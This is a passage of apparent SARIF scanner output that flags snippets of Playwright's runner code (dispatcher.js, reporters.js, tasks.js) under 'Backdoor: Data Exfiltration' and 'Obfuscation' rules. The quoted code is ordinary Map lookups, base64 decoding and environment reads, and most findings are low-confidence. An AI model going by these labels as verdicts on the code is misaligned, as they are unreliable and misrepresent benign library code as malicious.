                      "markdown": "`  if (reporters.length && !someReporterPrintsToStdio) {\n    // Add a line/dot/list-mode reporter for convenience.\n    // Important to put it first, just in case some other reporter stalls onEnd.\n    if (mode === 'list') reporters.unshift(new ListModeReporter());else if (mode !== 'merge') reporters.unshift(!process.env.CI ? new _line.default({\n      omitFailures: true\n    }) : new _dot.default());\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/reporters.js"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 75,
                  "endLine": 72,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    }\n  }\n  if (process.env.PW_TEST_REPORTER) {\n    const reporterConstructor = await (0, _loadUtils.loadReporter)(config, process.env.PW_TEST_REPORTER);\n    reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(runOptions)));\n  }\n  const someReporterPrintsToStdio = reporters.some(r => r.printsToStdio());\n",
                    "rendered": {
                      "text": "    }\n  }\n  if (process.env.PW_TEST_REPORTER) {\n    const reporterConstructor = await (0, _loadUtils.loadReporter)(config, process.env.PW_TEST_REPORTER);\n    reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(runOptions)));\n  }\n  const someReporterPrintsToStdio = reporters.some(r => r.printsToStdio());\n",
                      "markdown": "`    }\n  }\n  if (process.env.PW_TEST_REPORTER) {\n    const reporterConstructor = await (0, _loadUtils.loadReporter)(config, process.env.PW_TEST_REPORTER);\n    reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(runOptions)));\n  }\n  const someReporterPrintsToStdio = reporters.some(r => r.printsToStdio());\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/reporters.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 6,
                  "endLine": 71,
                  "endColumn": 17,
                  "snippet": {
                    "text": "      reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(options)));\n    }\n  }\n  if (process.env.PW_TEST_REPORTER) {\n    const reporterConstructor = await (0, _loadUtils.loadReporter)(config, process.env.PW_TEST_REPORTER);\n    reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(runOptions)));\n  }\n",
                    "rendered": {
                      "text": "      reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(options)));\n    }\n  }\n  if (process.env.PW_TEST_REPORTER) {\n    const reporterConstructor = await (0, _loadUtils.loadReporter)(config, process.env.PW_TEST_REPORTER);\n    reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(runOptions)));\n  }\n",
                      "markdown": "`      reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(options)));\n    }\n  }\n  if (process.env.PW_TEST_REPORTER) {\n    const reporterConstructor = await (0, _loadUtils.loadReporter)(config, process.env.PW_TEST_REPORTER);\n    reporters.push((0, _reporterV.wrapReporterAsV2)(new reporterConstructor(runOptions)));\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 531,
                  "startColumn": 37,
                  "endLine": 531,
                  "endColumn": 43,
                  "snippet": {
                    "text": "}\nfunction chunkFromParams(params) {\n  if (typeof params.text === 'string') return params.text;\n  return Buffer.from(params.buffer, 'base64');\n}",
                    "rendered": {
                      "text": "}\nfunction chunkFromParams(params) {\n  if (typeof params.text === 'string') return params.text;\n  return Buffer.from(params.buffer, 'base64');\n}",
                      "markdown": "`}\nfunction chunkFromParams(params) {\n  if (typeof params.text === 'string') return params.text;\n  return Buffer.from(params.buffer, 'base64');\n}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 353,
                  "startColumn": 66,
                  "endLine": 353,
                  "endColumn": 72,
                  "snippet": {
                    "text": "      name: params.name,\n      path: params.path,\n      contentType: params.contentType,\n      body: params.body !== undefined ? Buffer.from(params.body, 'base64') : undefined\n    };\n    data.result.attachments.push(attachment);\n  }\n",
                    "rendered": {
                      "text": "      name: params.name,\n      path: params.path,\n      contentType: params.contentType,\n      body: params.body !== undefined ? Buffer.from(params.body, 'base64') : undefined\n    };\n    data.result.attachments.push(attachment);\n  }\n",
                      "markdown": "`      name: params.name,\n      path: params.path,\n      contentType: params.contentType,\n      body: params.body !== undefined ? Buffer.from(params.body, 'base64') : undefined\n    };\n    data.result.attachments.push(attachment);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 42,
                  "endLine": 401,
                  "endColumn": 47,
                  "snippet": {
                    "text": "      return;\n    }\n    for (const testId of params.fatalUnknownTestIds || []) {\n      const test = this._remainingByTestId.get(testId);\n      if (test) {\n        this._remainingByTestId.delete(testId);\n        this._failTestWithErrors(test, [{\n",
                    "rendered": {
                      "text": "      return;\n    }\n    for (const testId of params.fatalUnknownTestIds || []) {\n      const test = this._remainingByTestId.get(testId);\n      if (test) {\n        this._remainingByTestId.delete(testId);\n        this._failTestWithErrors(test, [{\n",
                      "markdown": "`      return;\n    }\n    for (const testId of params.fatalUnknownTestIds || []) {\n      const test = this._remainingByTestId.get(testId);\n      if (test) {\n        this._remainingByTestId.delete(testId);\n        this._failTestWithErrors(test, [{\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 358,
                  "startColumn": 38,
                  "endLine": 358,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    data.result.attachments.push(attachment);\n  }\n  _failTestWithErrors(test, errors) {\n    const runData = this._dataByTestId.get(test.id);\n    // There might be a single test that has started but has not finished yet.\n    let result;\n    if (runData) {\n",
                    "rendered": {
                      "text": "    data.result.attachments.push(attachment);\n  }\n  _failTestWithErrors(test, errors) {\n    const runData = this._dataByTestId.get(test.id);\n    // There might be a single test that has started but has not finished yet.\n    let result;\n    if (runData) {\n",
                      "markdown": "`    data.result.attachments.push(attachment);\n  }\n  _failTestWithErrors(test, errors) {\n    const runData = this._dataByTestId.get(test.id);\n    // There might be a single test that has started but has not finished yet.\n    let result;\n    if (runData) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 35,
                  "endLine": 344,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    this._reporter.onStepEnd(test, result, step);\n  }\n  _onAttach(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but attachments are still coming. Just ignore them.\n      return;\n",
                    "rendered": {
                      "text": "    this._reporter.onStepEnd(test, result, step);\n  }\n  _onAttach(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but attachments are still coming. Just ignore them.\n      return;\n",
                      "markdown": "`    this._reporter.onStepEnd(test, result, step);\n  }\n  _onAttach(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but attachments are still coming. Just ignore them.\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 22,
                  "endLine": 333,
                  "endColumn": 27,
                  "snippet": {
                    "text": "      steps,\n      test\n    } = data;\n    const step = steps.get(params.stepId);\n    if (!step) {\n      this._reporter.onStdErr('Internal error: step end without step begin: ' + params.stepId, test, result);\n      return;\n",
                    "rendered": {
                      "text": "      steps,\n      test\n    } = data;\n    const step = steps.get(params.stepId);\n    if (!step) {\n      this._reporter.onStdErr('Internal error: step end without step begin: ' + params.stepId, test, result);\n      return;\n",
                      "markdown": "`      steps,\n      test\n    } = data;\n    const step = steps.get(params.stepId);\n    if (!step) {\n      this._reporter.onStdErr('Internal error: step end without step begin: ' + params.stepId, test, result);\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 323,
                  "startColumn": 35,
                  "endLine": 323,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    this._reporter.onStepBegin(test, result, step);\n  }\n  _onStepEnd(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but steps are still coming. Just ignore them.\n      return;\n",
                    "rendered": {
                      "text": "    this._reporter.onStepBegin(test, result, step);\n  }\n  _onStepEnd(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but steps are still coming. Just ignore them.\n      return;\n",
                      "markdown": "`    this._reporter.onStepBegin(test, result, step);\n  }\n  _onStepEnd(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but steps are still coming. Just ignore them.\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 50,
                  "endLine": 304,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      steps,\n      test\n    } = data;\n    const parentStep = params.parentStepId ? steps.get(params.parentStepId) : undefined;\n    const step = {\n      title: params.title,\n      titlePath: () => {\n",
                    "rendered": {
                      "text": "      steps,\n      test\n    } = data;\n    const parentStep = params.parentStepId ? steps.get(params.parentStepId) : undefined;\n    const step = {\n      title: params.title,\n      titlePath: () => {\n",
                      "markdown": "`      steps,\n      test\n    } = data;\n    const parentStep = params.parentStepId ? steps.get(params.parentStepId) : undefined;\n    const step = {\n      title: params.title,\n      titlePath: () => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 35,
                  "endLine": 294,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    }\n  }\n  _onStepBegin(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but steps are still coming. Just ignore them.\n      return;\n",
                    "rendered": {
                      "text": "    }\n  }\n  _onStepBegin(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but steps are still coming. Just ignore them.\n      return;\n",
                      "markdown": "`    }\n  }\n  _onStepBegin(params) {\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // The test has finished, but steps are still coming. Just ignore them.\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 35,
                  "endLine": 263,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      params.status = 'interrupted';\n      params.errors = [];\n    }\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // TODO: this should never be the case, report an internal error?\n      return;\n",
                    "rendered": {
                      "text": "      params.status = 'interrupted';\n      params.errors = [];\n    }\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // TODO: this should never be the case, report an internal error?\n      return;\n",
                      "markdown": "`      params.status = 'interrupted';\n      params.errors = [];\n    }\n    const data = this._dataByTestId.get(params.testId);\n    if (!data) {\n      // TODO: this should never be the case, report an internal error?\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 236,
                  "startColumn": 40,
                  "endLine": 236,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    this._remainingByTestId = new Map(this._job.tests.map(e => [e.id, e]));\n  }\n  _onTestBegin(params) {\n    const test = this._remainingByTestId.get(params.testId);\n    if (!test) {\n      // TODO: this should never be the case, report an internal error?\n      return;\n",
                    "rendered": {
                      "text": "    this._remainingByTestId = new Map(this._job.tests.map(e => [e.id, e]));\n  }\n  _onTestBegin(params) {\n    const test = this._remainingByTestId.get(params.testId);\n    if (!test) {\n      // TODO: this should never be the case, report an internal error?\n      return;\n",
                      "markdown": "`    this._remainingByTestId = new Map(this._job.tests.map(e => [e.id, e]));\n  }\n  _onTestBegin(params) {\n    const test = this._remainingByTestId.get(params.testId);\n    if (!test) {\n      // TODO: this should never be the case, report an internal error?\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 54,
                  "endLine": 197,
                  "endColumn": 59,
                  "snippet": {
                    "text": "      for (const error of params.fatalErrors) this._reporter.onError(error);\n    });\n    worker.on('exit', () => {\n      const producedEnv = this._producedEnvByProjectId.get(testGroup.projectId) || {};\n      this._producedEnvByProjectId.set(testGroup.projectId, {\n        ...producedEnv,\n        ...worker.producedEnv()\n",
                    "rendered": {
                      "text": "      for (const error of params.fatalErrors) this._reporter.onError(error);\n    });\n    worker.on('exit', () => {\n      const producedEnv = this._producedEnvByProjectId.get(testGroup.projectId) || {};\n      this._producedEnvByProjectId.set(testGroup.projectId, {\n        ...producedEnv,\n        ...worker.producedEnv()\n",
                      "markdown": "`      for (const error of params.fatalErrors) this._reporter.onError(error);\n    });\n    worker.on('exit', () => {\n      const producedEnv = this._producedEnvByProjectId.get(testGroup.projectId) || {};\n      this._producedEnvByProjectId.set(testGroup.projectId, {\n        ...producedEnv,\n        ...worker.producedEnv()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 109,
                  "endLine": 152,
                  "endColumn": 114,
                  "snippet": {
                    "text": "  _createWorker(testGroup, parallelIndex, loaderData) {\n    const projectConfig = this._config.projects.find(p => p.id === testGroup.projectId);\n    const outputDir = projectConfig.project.outputDir;\n    const worker = new _workerHost.WorkerHost(testGroup, parallelIndex, loaderData, this._extraEnvByProjectId.get(testGroup.projectId) || {}, outputDir);\n    const handleOutput = params => {\n      var _this$_workerSlots$pa;\n      const chunk = chunkFromParams(params);\n",
                    "rendered": {
                      "text": "  _createWorker(testGroup, parallelIndex, loaderData) {\n    const projectConfig = this._config.projects.find(p => p.id === testGroup.projectId);\n    const outputDir = projectConfig.project.outputDir;\n    const worker = new _workerHost.WorkerHost(testGroup, parallelIndex, loaderData, this._extraEnvByProjectId.get(testGroup.projectId) || {}, outputDir);\n    const handleOutput = params => {\n      var _this$_workerSlots$pa;\n      const chunk = chunkFromParams(params);\n",
                      "markdown": "`  _createWorker(testGroup, parallelIndex, loaderData) {\n    const projectConfig = this._config.projects.find(p => p.id === testGroup.projectId);\n    const outputDir = projectConfig.project.outputDir;\n    const worker = new _workerHost.WorkerHost(testGroup, parallelIndex, loaderData, this._extraEnvByProjectId.get(testGroup.projectId) || {}, outputDir);\n    const handleOutput = params => {\n      var _this$_workerSlots$pa;\n      const chunk = chunkFromParams(params);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 84,
                  "endLine": 128,
                  "endColumn": 89,
                  "snippet": {
                    "text": "    return workersWithSameHash > this._queuedOrRunningHashCount.get(worker.hash());\n  }\n  _updateCounterForWorkerHash(hash, delta) {\n    this._queuedOrRunningHashCount.set(hash, delta + (this._queuedOrRunningHashCount.get(hash) || 0));\n  }\n  async run(testGroups, extraEnvByProjectId) {\n    this._extraEnvByProjectId = extraEnvByProjectId;\n",
                    "rendered": {
                      "text": "    return workersWithSameHash > this._queuedOrRunningHashCount.get(worker.hash());\n  }\n  _updateCounterForWorkerHash(hash, delta) {\n    this._queuedOrRunningHashCount.set(hash, delta + (this._queuedOrRunningHashCount.get(hash) || 0));\n  }\n  async run(testGroups, extraEnvByProjectId) {\n    this._extraEnvByProjectId = extraEnvByProjectId;\n",
                      "markdown": "`    return workersWithSameHash > this._queuedOrRunningHashCount.get(worker.hash());\n  }\n  _updateCounterForWorkerHash(hash, delta) {\n    this._queuedOrRunningHashCount.set(hash, delta + (this._queuedOrRunningHashCount.get(hash) || 0));\n  }\n  async run(testGroups, extraEnvByProjectId) {\n    this._extraEnvByProjectId = extraEnvByProjectId;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 63,
                  "endLine": 125,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    for (const slot of this._workerSlots) {\n      if (slot.worker && !slot.worker.didSendStop() && slot.worker.hash() === worker.hash()) workersWithSameHash++;\n    }\n    return workersWithSameHash > this._queuedOrRunningHashCount.get(worker.hash());\n  }\n  _updateCounterForWorkerHash(hash, delta) {\n    this._queuedOrRunningHashCount.set(hash, delta + (this._queuedOrRunningHashCount.get(hash) || 0));\n",
                    "rendered": {
                      "text": "    for (const slot of this._workerSlots) {\n      if (slot.worker && !slot.worker.didSendStop() && slot.worker.hash() === worker.hash()) workersWithSameHash++;\n    }\n    return workersWithSameHash > this._queuedOrRunningHashCount.get(worker.hash());\n  }\n  _updateCounterForWorkerHash(hash, delta) {\n    this._queuedOrRunningHashCount.set(hash, delta + (this._queuedOrRunningHashCount.get(hash) || 0));\n",
                      "markdown": "`    for (const slot of this._workerSlots) {\n      if (slot.worker && !slot.worker.didSendStop() && slot.worker.hash() === worker.hash()) workersWithSameHash++;\n    }\n    return workersWithSameHash > this._queuedOrRunningHashCount.get(worker.hash());\n  }\n  _updateCounterForWorkerHash(hash, delta) {\n    this._queuedOrRunningHashCount.set(hash, delta + (this._queuedOrRunningHashCount.get(hash) || 0));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 20,
                  "endLine": 197,
                  "endColumn": 58,
                  "snippet": {
                    "text": "      for (const error of params.fatalErrors) this._reporter.onError(error);\n    });\n    worker.on('exit', () => {\n      const producedEnv = this._producedEnvByProjectId.get(testGroup.projectId) || {};\n      this._producedEnvByProjectId.set(testGroup.projectId, {\n        ...producedEnv,\n        ...worker.producedEnv()\n",
                    "rendered": {
                      "text": "      for (const error of params.fatalErrors) this._reporter.onError(error);\n    });\n    worker.on('exit', () => {\n      const producedEnv = this._producedEnvByProjectId.get(testGroup.projectId) || {};\n      this._producedEnvByProjectId.set(testGroup.projectId, {\n        ...producedEnv,\n        ...worker.producedEnv()\n",
                      "markdown": "`      for (const error of params.fatalErrors) this._reporter.onError(error);\n    });\n    worker.on('exit', () => {\n      const producedEnv = this._producedEnvByProjectId.get(testGroup.projectId) || {};\n      this._producedEnvByProjectId.set(testGroup.projectId, {\n        ...producedEnv,\n        ...worker.producedEnv()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/dispatcher.js"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 95,
                  "endLine": 152,
                  "endColumn": 113,
                  "snippet": {
                    "text": "  _createWorker(testGroup, parallelIndex, loaderData) {\n    const projectConfig = this._config.projects.find(p => p.id === testGroup.projectId);\n    const outputDir = projectConfig.project.outputDir;\n    const worker = new _workerHost.WorkerHost(testGroup, parallelIndex, loaderData, this._extraEnvByProjectId.get(testGroup.projectId) || {}, outputDir);\n    const handleOutput = params => {\n      var _this$_workerSlots$pa;\n      const chunk = chunkFromParams(params);\n",
                    "rendered": {
                      "text": "  _createWorker(testGroup, parallelIndex, loaderData) {\n    const projectConfig = this._config.projects.find(p => p.id === testGroup.projectId);\n    const outputDir = projectConfig.project.outputDir;\n    const worker = new _workerHost.WorkerHost(testGroup, parallelIndex, loaderData, this._extraEnvByProjectId.get(testGroup.projectId) || {}, outputDir);\n    const handleOutput = params => {\n      var _this$_workerSlots$pa;\n      const chunk = chunkFromParams(params);\n",
                      "markdown": "`  _createWorker(testGroup, parallelIndex, loaderData) {\n    const projectConfig = this._config.projects.find(p => p.id === testGroup.projectId);\n    const outputDir = projectConfig.project.outputDir;\n    const worker = new _workerHost.WorkerHost(testGroup, parallelIndex, loaderData, this._extraEnvByProjectId.get(testGroup.projectId) || {}, outputDir);\n    const handleOutput = params => {\n      var _this$_workerSlots$pa;\n      const chunk = chunkFromParams(params);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 48,
                  "endLine": 340,
                  "endColumn": 53,
                  "snippet": {
                    "text": "          await dispatcher.run(phaseTestGroups, extraEnvByProjectId);\n          await dispatcher.stop();\n          for (const [projectId, envProduced] of dispatcher.producedEnvByProjectId()) {\n            const extraEnv = extraEnvByProjectId.get(projectId) || {};\n            extraEnvByProjectId.set(projectId, {\n              ...extraEnv,\n              ...envProduced\n",
                    "rendered": {
                      "text": "          await dispatcher.run(phaseTestGroups, extraEnvByProjectId);\n          await dispatcher.stop();\n          for (const [projectId, envProduced] of dispatcher.producedEnvByProjectId()) {\n            const extraEnv = extraEnvByProjectId.get(projectId) || {};\n            extraEnvByProjectId.set(projectId, {\n              ...extraEnv,\n              ...envProduced\n",
                      "markdown": "`          await dispatcher.run(phaseTestGroups, extraEnvByProjectId);\n          await dispatcher.stop();\n          for (const [projectId, envProduced] of dispatcher.producedEnvByProjectId()) {\n            const extraEnv = extraEnvByProjectId.get(projectId) || {};\n            extraEnvByProjectId.set(projectId, {\n              ...extraEnv,\n              ...envProduced\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/tasks.js"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 34,
                  "endLine": 330,
                  "endColumn": 39,
                  "snippet": {
                    "text": "          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n          extraEnvByProjectId.set(project.id, extraEnv);\n          const hasFailedDeps = project.deps.some(p => !successfulProjects.has(p));\n",
                    "rendered": {
                      "text": "          };\n          for (const setup of teardownToSetups.get(project) || []) extraEnv = {\n            ...extraEnv,\n            ...extraEnvByProjectId.get(setup.id)\n          };\n          extraEnvByProjectId.set(project.id, extraEnv);\n          const hasFailedDeps = project.deps.some(p => !successfulProjects.has(p));\n",
